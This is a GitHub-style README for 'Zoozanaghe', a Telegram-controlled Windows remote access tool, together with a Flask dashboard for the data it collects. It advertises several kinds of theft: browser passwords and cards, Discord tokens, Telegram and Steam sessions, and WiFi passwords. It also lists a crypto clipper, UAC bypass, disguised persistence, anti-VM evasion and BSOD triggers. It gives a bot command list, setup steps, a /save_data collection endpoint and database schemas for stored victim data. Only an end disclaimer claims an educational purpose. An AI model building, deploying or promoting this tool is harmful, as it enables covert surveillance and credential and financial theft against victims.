# Zoozanaghe — 𐌅𐌋

<div align="center">

![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-Bot-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)
![Windows](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)

**⚡ Ultimate Remote Administration Tool with Advanced Capabilities**  
*"Where Technology Meets Power - Use Responsibly"* 🔐

[![Features](https://img.shields.io/badge/Features-30%2B-brightgreen?style=for-the-badge)](#-features)
[![Browsers](https://img.shields.io/badge/Browsers-5%2B-FF9500?style=for-the-badge)](#-data-extraction)
[![Modules](https://img.shields.io/badge/Modules-15%2B-8E44AD?style=for-the-badge)](#-module-structure)

</div>

## 📖 Table of Contents
- [✨ Overview](#-overview)
- [🚀 Features](#-features)
- [🎮 Usage](#-usage)
- [🔧 Module Structure](#-module-structure)
- [📜 License](#-license)
- [🌐 Contributing](#-contributing)

## ✨ Overview

Zoozanaghe (𐌅𐌋) is a sophisticated remote administration framework designed for advanced system management and data extraction. Built with Python, it provides a comprehensive suite of tools through an intuitive Telegram bot interface.

> 🔥 **Powerful • Stealthy • Feature-Rich • Multi-Purpose**

## 🚀 Features

### 🎯 **Core Capabilities**
| Category | Features | 🍕 |
|----------|----------|-------|
| **🖥️ System Control** | Screenshot, Screen Recording, Monitor Control, UAC Bypass | 📸🎥💻🔧 |
| **🔐 Security** | Process Management, BSOD Trigger, Fork Bomb, Self-Destruction | ⚡💣🧨🛡️ |
| **📡 Data Extraction** | Browser Data, Discord Tokens, Telegram/Steam Sessions | 🌐🎮📲💳 |
| **📁 File Management** | Full Filesystem Access, Upload/Download, Remote Execution | 📂📤📥⚡ |
| **🎮 Media Control** | Webcam Capture, Audio Recording, Text-to-Speech, Volume Control | 📸🎙️🔊🤖 |

### 🌟 **Highlight Features**
- **🔒 Multi-Browser Support** (Chrome, Edge, Brave, Opera, Yandex)
- **💳 Payment Data Extraction** (Credit Cards, Crypto Wallets)
- **🌐 Network Manipulation** (Website Blocking, WiFi Credentials)
- **⚡ Real-time Control** (Instant Response via Telegram)
- **🎭 Stealth Operation** (Anti-Detection Techniques)

## 🛠️ installation

### 📋 Prerequisites
- Python 3.8+
- Windows OS
- Telegram Bot Token
- Administrative Privileges (Recommended)

### 🔧 Setup Steps

1. **Clone Repository**
   ```bash
   git clone https://github.com/yourusername/zoozanaghe.git
   cd zoozanaghe
2. **Install Dependencies**
   ```bash
     pip install -r requirements.txt
     pip install pytelegrambotapi requests pycryptodome pycaw sounddevice wavio pillow opencv-python psutil discord.py
3. **Configuration Setup**
   - Edit config.json with your settings (example below).
     ```json
     {
      "telegram_config": {
        "bot_token": "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11",
        "chat_id": "123456789"
      },
      "webhook_url": "https://discord.com/api/webhooks/...",
      "startup_name": "WindowsSystemService",
      "admin_ids": [123456789, 987654321],
      "clipper_addresses": {
        "BTC": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "ETH": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
      }
     }

## 🎛️ Bot Commands Overview
```bash
/start - Show help menu
/register - Register system
/systems - List connected systems
/select - Choose target system
/ss - Capture screenshot
/screenrec - Record screen
/monitorsoff - Turn off displays
/bsod - Trigger Blue Screen
/grabbrowser - Extract browser data
/discord - Harvest Discord tokens
/grabtelegram - Extract Telegram sessions
/grabsteam - Extract Steam sessions
/wifi - Retrieve WiFi passwords
/ls - List directory contents
/cd - Change directory
/download - Download file
/upload - Upload file
/remove - Delete file
/execute - Execute file
/blockinput - Block input devices
/unblockinput - Unblock input devices
/websiteblock - Block website
/websiteunblock - Unblock website
/startclipper - Start crypto clipper
/cmd - Run system command
/processes - List processes
/kill - Kill process
/foreground - Get foreground process
/webcam - Capture webcam
/volume - Set volume level
/recordmic - Record microphone
/tts - Text-to-speech
/uacbypass - Attempt UAC bypass
/implode - Self-destruct
```

## 🎮 Usage 
- 🚀 Initialization
  ```python
  # The bot automatically:
  # 1. Registers system on startup
  # 2. Attempts UAC bypass
  # 3. Adds to startup persistence
  # 4. Starts Telegram bot listener
  # 5. Extracts and sends initial system information
  ```

## 📱 Telegram Interaction Examples
- System Registration:
  ```yaml
  User: /register
  Bot: 🍀سیستم با موفقیت ثبت شد:
  
  🔹 System-PC123 [🟢 Online]
  🆔 `DESKTOP-ABC123_1705345200`
  💻 Windows 10 | 8 Core | 16GB RAM
  🛡️ Antivirus: Windows Defender
  🔐 Privilege: Admin
  🌐 192.168.1.100
  ⏱ Last Active: 2024-01-15 14:30:25
  ```
- Browser Data Extraction:
  ```vbent
  User: /grabbrowser
  Bot: ⏳ Extracting browser data from selected system...
  Bot: 📁 [File] browser_data_20240115_143025.zip
       🌐 Browser data from System-PC123
  ```
- Discord Token Harvesting:
  ```yaml
  User: /discord
  Bot: 🔍 Searching for Discord tokens on System-PC123...
  Bot: 🔑 Found Discord Tokens on System-PC123:
  
  👤 User: JohnDoe#1234
  📧 Email: john.doe@example.com
  📱 Phone: +1234567890
  💎 Nitro: Nitro Classic
  🔑 Token: `MTExMTExMTExMTExMTExMTEx...`
  ```
## 🏗️ Architecture
```sql
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   Telegram Bot  │ ←→ │  System Manager  │ ←→ │  Core Modules   │
└─────────────────┘    └──────────────────┘    └─────────────────┘
         │                       │                       │
         ↓                       ↓                       ↓
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│  User Interface │    │  System Registry │    │ Data Processors │
└─────────────────┘    └──────────────────┘    └─────────────────┘
```

## ⚡ Performance Features 
- Multi-threaded operation for concurrent task execution
- Non-blocking I/O operations for responsive performance
- Efficient memory management with automatic cleanup
- Error handling and recovery mechanisms
- Stealth operation with anti-detection techniques

## 🔧 Module Structure 
| Module            | Purpose                                           | Status   |
| ----------------- | ------------------------------------------------- | -------- |
| SystemManager     | Central system coordination and management        | ✅ Active |
| BrowserExtractor  | Multi-browser data harvesting and extraction      | ✅ Active |
| TokenExtractor    | Discord token extraction and validation           | ✅ Active |
| TelegramExtractor | Telegram session recovery and extraction          | ✅ Active |
| SteamExtractor    | Steam session capture and analysis                | ✅ Active |
| NetworkManager    | Network operations and WiFi credential extraction | ✅ Active |
| FileManager       | File system operations and management             | ✅ Active |
| ProcessManager    | Process monitoring and control                    | ✅ Active |
| AudioManager      | Audio recording and playback control              | ✅ Active |
| VideoManager      | Webcam capture and screen recording               | ✅ Active |

## 🎨 Advanced Modules
- 🔐 Crypto Clipper - Real-time cryptocurrency address replacement
- 🎭 Anti-VM - Virtual machine detection and evasion techniques
- ⚡ Persistence - Startup registration and system integration
- 📊 Data Exfiltration - Secure data transmission methods
- 🛡️ UAC Bypass - User Account Control bypass mechanisms
- 🔒 Privilege Escalation - System privilege elevation techniques




# 🌐 Zoozanaghe Web Interface

<div align="center">

![Flask](https://img.shields.io/badge/Flask-2.3.3-black?style=for-the-badge&logo=flask)
![SQLite](https://img.shields.io/badge/SQLite-3.42.0-blue?style=for-the-badge&logo=sqlite)
![Bootstrap](https://img.shields.io/badge/Bootstrap-5.3.0-7952B3?style=for-the-badge&logo=bootstrap)
![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python)

**📊 Web Dashboard for Zoozanaghe Data Management**  
*Visualize and analyze extracted data through a modern web interface*

</div>


## ✨ Overview

The Zoozanaghe Web Interface provides a comprehensive dashboard for viewing and managing data collected by the Zoozanaghe remote administration tool. Built with Flask and SQLite, it offers a clean, responsive interface for analyzing system information, Discord tokens, and browser data.

## 🚀 Features

### 📋 Core Functionality
- **📊 System Overview** - View all connected systems with detailed information
- **🔐 Token Management** - Browse and analyze extracted Discord tokens
- **🌐 Browser Data Explorer** - Examine harvested browser data (passwords, cookies, history, etc.)
- **📈 Real-time Updates** - Live data updates as new information is received
- **🔍 Advanced Search** - Filter and search through collected data

### 🎨 User Interface
- **📱 Responsive Design** - Works on desktop, tablet, and mobile devices
- **🎯 Modern Dashboard** - Clean, intuitive interface with Bootstrap 5
- **📊 Data Visualization** - Organized presentation of complex data
- **⚡ Fast Performance** - Optimized database queries and caching

## 🏗️ Architecture

### 📦 Component Diagram
```sql
┌─────────────────┐ ┌──────────────────┐ ┌─────────────────┐
│ Web Browser │ ←→ │ Flask Server │ ←→ │ SQLite DB │
└─────────────────┘ └──────────────────┘ └─────────────────┘
│ │ │
↓ ↓ ↓
┌─────────────────┐ ┌──────────────────┐ ┌─────────────────┐
│ HTML Templates │ │ Request Handler │ │ Data Storage │
└─────────────────┘ └──────────────────┘ └─────────────────┘
```


<img width="1918" height="831" alt="image" src="https://github.com/user-attachments/assets/9c57679b-ef53-4c5a-8a88-d10b30148be4" />

<img width="1920" height="1033" alt="image" src="https://github.com/user-attachments/assets/3cf5d4b8-0120-404d-8ae4-a032583797b6" />
<img width="1920" height="1036" alt="image" src="https://github.com/user-attachments/assets/b1d4b211-670f-4057-bab7-70fb5f10f78f" />







### 🔄 Data Flow
1. **📥 Data Reception** - JSON data posted to `/save_data` endpoint
2. **💾 Data Storage** - Information stored in structured SQLite database
3. **📊 Data Presentation** - Web interface displays organized information
4. **🔍 Data Querying** - Users can filter and search through data

## 🛠️ Installation

### 📋 Prerequisites
- Python 3.8+
- Flask 2.3.3+
- SQLite3

### 🔧 Setup Steps

1. **Clone the Repository**
   ```bash
   git clone https://github.com/M-thefl/zoozanaghe
   cd zoozanaghe
   cd app

2. **Install Dependencies**
   ```bash
   pip install flask
   ```

3. **Initialize Database**
   ```bash
   # Create database schema
    python -c "
    import sqlite3
    conn = sqlite3.connect('database/data.db')
    with open('database/schema.sql', 'r') as f:
        conn.executescript(f.read())
    conn.commit()
    conn.close()
    print('Database initialized successfully')
    "
    ```
4. **Run the Application**
   ```bash
   python app.py
   ```

5. **Access the Web Interface**
   Open your browser and navigate to: http://localhost:3000

## ⚙️ Configuration

- 🎛️ Application Settings
  ```python
  app = Flask(__name__)
  app.config['DATABASE'] = 'database/data.db'  # Database path
  app.config['SECRET_KEY'] = 'your-secret-key-here'  # Change this!
  app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
  ```
  
- 🔧 Environment Variables
```bash
export FLASK_ENV=production
export FLASK_DEBUG=0
export DATABASE_URL=sqlite:///database/data.db
export SECRET_KEY=your-super-secret-key
```
 
## 🔌 API Endpoints
- 📥 POST /save_data
Accepts JSON data from Zoozanaghe clients and stores it in the database.

Request Body:

```json
{
  "system_name": "Victim-PC",
  "pc_name": "DESKTOP-ABC123",
  "os_info": "Windows 10 Pro",
  "tokens": [
    {
      "token": "user_token_here",
      "username": "JohnDoe",
      "discriminator": "1234",
      "user_id": "123456789012345678",
      "email": "john.doe@example.com",
      "phone": "+1234567890",
      "mfa_enabled": true,
      "nitro_type": "Nitro Classic",
      "payment_methods": ["credit_card", "paypal"],
      "avatar": "https://cdn.discordapp.com/avatars/..."
    }
  ],
  "browser_data": {
    "Chrome": {
      "logins": [...],
      "cookies": [...],
      "history": [...],
      "downloads": [...],
      "credit_cards": [...]
    }
  }
}
```
Response:

```json
{
  "status": "success",
  "system_id": 123
}
```

- 📊 GET /
Main dashboard showing all systems.

- 🔍 GET /system/<int:system_id>
Detailed view of a specific system with all collected data.

## 📊 Database Schema
- 🗃️ Tables Structure
📋 Systems Table
```sqp
CREATE TABLE systems (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    pc_name TEXT NOT NULL,
    os_info TEXT NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

🔐 Tokens Table
```sql
CREATE TABLE tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    system_id INTEGER NOT NULL,
    token TEXT NOT NULL,
    username TEXT,
    discriminator TEXT,
    user_id TEXT,
    email TEXT,
    phone TEXT,
    mfa_enabled BOOLEAN DEFAULT 0,
    nitro_type TEXT,
    payment_methods TEXT,
    avatar TEXT,
    FOREIGN KEY (system_id) REFERENCES systems (id) ON DELETE CASCADE
);
```
🌐 Browser Data Table
```sqp
CREATE TABLE browser_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    system_id INTEGER NOT NULL,
    browser_name TEXT NOT NULL,
    data_type TEXT NOT NULL,
    content TEXT,
    FOREIGN KEY (system_id) REFERENCES systems (id) ON DELETE CASCADE
);
```


## 🚀 Deployment

- 🐳 Docker Deployment
```dockerfile
FROM python:3.9-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt

COPY . .
EXPOSE 3000

CMD ["python", "app.py"]
```
- ☁️ Production Deployment
1 Use production WSGI server

```bash
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:3000 app:app
```
2 Configure reverse proxy (Nginx)
```nginx
server {
    listen 80;
    server_name your-domain.com;
    
    location / {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

3 Set up SSL certificate
```bash
certbot --nginx -d your-domain.com
```

## 🔒 Security Considerations
**🛡️ Security Best Practices**
- ✅ Change default secret key
- ✅ Use HTTPS in production
- ✅ Implement rate limiting
- ✅ Validate and sanitize all inputs
- ✅ Use parameterized queries to prevent SQL injection
- ✅ Restrict access to authorized users only

**🔐 Authentication Setup (Optional)**
```python
# Basic authentication example
from flask_httpauth import HTTPBasicAuth

auth = HTTPBasicAuth()

@auth.verify_password
def verify_password(username, password):
    return username == 'admin' and password == 'secret'

@app.route('/admin')
@auth.login_required
def admin_panel():
    return render_template('admin.html')
```


## 📊 Monitoring and Logging
- 📝 Logging Configuration
```python
import logging
from logging.handlers import RotatingFileHandler

# Setup logging
handler = RotatingFileHandler('app.log', maxBytes=10000, backupCount=3)
handler.setLevel(logging.INFO)
app.logger.addHandler(handler)
```
- 🔍 Health Check Endpoint
```python
@app.route('/health')
def health_check():
    try:
        db = get_db()
        db.execute('SELECT 1')
        return jsonify({'status': 'healthy', 'database': 'connected'})
    except Exception as e:
        return jsonify({'status': 'unhealthy', 'error': str(e)}), 500
```

## 🌟 Getting Started

**1. Start the web server**
```
python app.py
```
**2. Configure Zoozanaghe client to send data**
  ```python
  # In your Zoozanaghe config
  "web_interface_url": "http://your-server:3000/save_data"
  ```
**3 .Access the dashboard**
Open http://localhost:3000 in your browser


- sql
    ```sql
    -- database/schema.sql
  CREATE TABLE IF NOT EXISTS systems (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      pc_name TEXT NOT NULL,
      os_info TEXT NOT NULL,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  
  CREATE TABLE IF NOT EXISTS tokens (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      system_id INTEGER NOT NULL,
      token TEXT NOT NULL,
      username TEXT,
      discriminator TEXT,
      user_id TEXT,
      email TEXT,
      phone TEXT,
      mfa_enabled BOOLEAN DEFAULT 0,
      nitro_type TEXT,
      payment_methods TEXT,
      avatar TEXT,
      FOREIGN KEY (system_id) REFERENCES systems (id) ON DELETE CASCADE
  );
  
  CREATE TABLE IF NOT EXISTS browser_data (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      system_id INTEGER NOT NULL,
      browser_name TEXT NOT NULL,
      data_type TEXT NOT NULL,
      content TEXT,
      FOREIGN KEY (system_id) REFERENCES systems (id) ON DELETE CASCADE
  );
  
  CREATE INDEX IF NOT EXISTS idx_system_id ON tokens (system_id);
  CREATE INDEX IF NOT EXISTS idx_browser_system_id ON browser_data (system_id);
  CREATE INDEX IF NOT EXISTS idx_browser_name ON browser_data (browser_name);
  CREATE INDEX IF NOT EXISTS idx_data_type ON browser_data (data_type);
  ```


## ⚠️ Disclaimer
**🚫 LEGAL NOTICE: This software is intended for EDUCATIONAL PURPOSES and SECURITY RESEARCH ONLY. The developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Use only on systems you own or have explicit permission to test.**

## 📋 Responsible Usage
- Educational Use: Learn about system security and vulnerabilities
- Research Purposes: Study malware techniques for defensive purposes
- Penetration Testing: Use only with explicit written permission
- Security Training: Train security professionals in defense techniques
- System Hardening: Test and improve system security measures


## 🌐 Contributing
We welcome contributions from the security research community! Please feel free to submit issues, feature requests, or pull requests.

## 🤝 Contribution Guidelines
```bash
# Fork the repository and create your feature branch
git checkout -b feature/AmazingFeature

# Commit your changes with descriptive messages
git commit -m "Add some AmazingFeature"

# Push to the branch
git push origin feature/AmazingFeature

# Open a Pull Request with detailed description
```
## 📋 Contribution Areas
- Security Research: New vulnerability discoveries and exploits
- Code Improvements: Performance optimizations and bug fixes
- Documentation: Improved documentation and usage guides
- Testing: Additional test cases and coverage
- Features: New modules and capabilities

## 📞 Support
For questions, support, and responsible disclosure:
- 📧 Email: Mahbodfl1@gmail.com
- 💬 Telegram: @Mahbodfl
- 🐛 Issues: GitHub Issues Page

## 📜 License
This project is licensed under the MIT License - see the LICENSE file for details.
```sql
MIT License
Copyright (c) 2024 Zoozanaghe Development Team

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## 🌟 Community
Join our Discord community for discussions
https://discord.gg/K2RdmqrM93

Participate in security research collaborations

Attend our virtual workshops and training sessions

Contribute to open source security projects

<div align="center"> ⭐ Show your support Give a star ⭐ if this project helped you in your security research!

"With great power comes great responsibility" - Use wisely and ethically 🧠
